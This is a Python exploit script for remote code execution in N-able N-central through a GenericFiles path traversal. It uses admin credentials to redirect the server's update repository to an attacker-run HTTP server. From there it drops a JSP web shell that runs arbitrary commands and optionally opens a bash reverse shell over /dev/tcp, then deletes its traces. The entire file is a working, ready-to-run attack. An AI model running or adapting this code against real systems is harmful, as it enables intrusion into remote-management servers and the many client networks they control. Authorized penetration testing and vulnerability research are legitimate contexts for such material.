#!/usr/bin/env python3
import argparse
import getpass
import hashlib
import html
import json
import os
import queue
import re
import secrets
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests
import urllib3


requests_seen = queue.Queue()
files = {}


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        requests_seen.put(self.path)
        body = files.get(self.path, b"not found")
        self.send_response(200 if self.path in files else 404)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *_):
        pass


def form_value(body, name):
    tag = re.search(rf'<input[^>]+name=["\']{re.escape(name)}["\'][^>]*>', body, re.I)
    value = re.search(r'value=["\']([^"\']*)["\']', tag.group(0), re.I) if tag else None
    return html.unescape(value.group(1) if value else "")


def main():
    global files
    p = argparse.ArgumentParser(description="N-central SIS GenericFiles traversal RCE")
    p.add_argument("--target", default="https://192.168.1.14:8443")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--listen-host", default="0.0.0.0")
    p.add_argument("--callback-host", required=True)
    p.add_argument("--port", type=int, default=8002)
    p.add_argument("--command", default="/usr/bin/id")
    p.add_argument("--lhost")
    p.add_argument("--lport", type=int)
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    reverse = bool(a.lhost or a.lport)
    if reverse and not (a.lhost and a.lport):
        p.error("--lhost and --lport must be supplied together")
    command = a.command if not reverse else f"bash -i >& /dev/tcp/{a.lhost}/{a.lport} 0>&1"

    suffix = secrets.token_hex(5)
    seed = "seed_" + suffix + ".bin"
    jsp_name = "exec_" + suffix + ".jsp"
    version = f"99.99.{int(time.time()) % 1000000}.1."
    traversal_version = version + "/../../tmp"
    seed_path = f"/opt/nable/webapps/ROOT/download/{version}/macosx/N-central/{seed}"
    java_command = json.dumps(command)
    if reverse:
        java = f'new ProcessBuilder("/bin/bash","-c",{java_command}).start();out.print("started\\n");'
    else:
        java = (
            f'Process p=new ProcessBuilder("/bin/bash","-c",{java_command}).redirectErrorStream(true).start();'
            'byte[] b=p.getInputStream().readAllBytes();p.waitFor();'
            'out.print(new String(b,java.nio.charset.StandardCharsets.UTF_8));'
        )
    java += (
        f'boolean deletedSeed=java.nio.file.Files.deleteIfExists(java.nio.file.Paths.get({json.dumps(seed_path)}));'
        'boolean deletedSource=java.nio.file.Files.deleteIfExists(java.nio.file.Paths.get(application.getRealPath(request.getServletPath())));'
        'out.print("cleanup="+(deletedSeed&&deletedSource?"ok":"failed")+"\\n");'
    )
    jsp = ('<%@ page contentType="text/plain;charset=UTF-8" %><%' + java + '%>').encode()
    seed_body = b"seed\n"
    base = f"http://{a.callback_host}:{a.port}"
    repository_xml = b'<repository><item type="GenericFiles" timestamp="1" signature="1" signal="false"/></repository>'
    entries = [
        (seed, version, seed_body),
        (jsp_name, traversal_version, jsp),
    ]
    generic_xml = (
        '<GenericFiles><Range Name="all" Minimum="0.0.0.0" Maximum="9999.0.0.0">'
        + "".join(
            f'<GenericFile Name="{base}/payload/{name}" Version="{ver}" '
            f'Checksum="{hashlib.sha1(body).hexdigest().upper()}" Type="N-centralMacAgent" '
            f'FileID="InstallationCustomerScript" ComponentVersion="{ver}" Architecture="universal" '
            f'IsURL="true" Size="{len(body)}" Description="" SupportedOS="macosx"/>'
            for name, ver, body in entries
        )
        + '</Range></GenericFiles>'
    ).encode()
    files = {
        "/repo/Repository.xml": repository_xml,
        "/repo/GenericFiles.xml": generic_xml,
        "/payload/" + seed: seed_body,
        "/payload/" + jsp_name: jsp,
    }
    server = ThreadingHTTPServer((a.listen_host, a.port), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    target = a.target.rstrip("/")
    s = requests.Session()
    s.verify = False
    s.get(target + "/login", timeout=30)
    login = s.post(
        target + "/loginLoginAction.action",
        data={"username": a.username, "password": password, "customerId": "1", "soName": ""},
        allow_redirects=False,
        timeout=30,
    )
    if login.status_code != 302:
        raise SystemExit(f"login={login.status_code}")
    headers = {"X-Requested-With": "XMLHttpRequest", "ncentralTabId": "sis"}
    s.get(target + "/IndexAction.action", timeout=30)
    s.get(
        target + "/refreshNavAction.action",
        headers=headers,
        params={"ncentralTabId": "sis", "custId": "1", "custName": "System"},
        timeout=30,
    )
    definition = s.get(
        target + "/definitionFileUpdateProcessAction.action",
        headers=headers,
        params={"ncentralTabId": "sis"},
        timeout=60,
    )
    original = {
        "url": form_value(definition.text, "customeServerAddress"),
        "interval": form_value(definition.text, "pollingInterval"),
        "enabled": bool(re.search(r'name=["\']enablePolling["\'][^>]+checked=', definition.text, re.I)),
    }

    def save(url, interval, enabled):
        return s.post(
            target + "/saveFileUpdateProcessAction.action",
            headers=headers,
            data={
                "ncentralTabId": "sis",
                "enablePolling": "true" if enabled else "false",
                "__checkbox_enablePolling": "true",
                "pollingInterval": interval,
                "customeServerAddress": url,
                "serverAddress": "-1",
            },
            timeout=240,
        )

    try:
        saved = save(base + "/repo", original["interval"], original["enabled"])
        needed = set(files)
        deadline = time.monotonic() + 30
        while needed and time.monotonic() < deadline:
            try:
                needed.discard(requests_seen.get(timeout=1).split("?", 1)[0])
            except queue.Empty:
                pass
        if needed:
            raise SystemExit("missing_fetch=" + ",".join(sorted(needed)))
        result = s.get(target + "/tmp/macosx/N-central/" + jsp_name, timeout=15 if reverse else 120)
        print(f"login={login.status_code}")
        print(f"save={saved.status_code}")
        print(f"execute={result.status_code}")
        if result.text:
            print(result.text.strip())
    finally:
        save(original["url"], original["interval"], original["enabled"])
        server.shutdown()


if __name__ == "__main__":
    main()
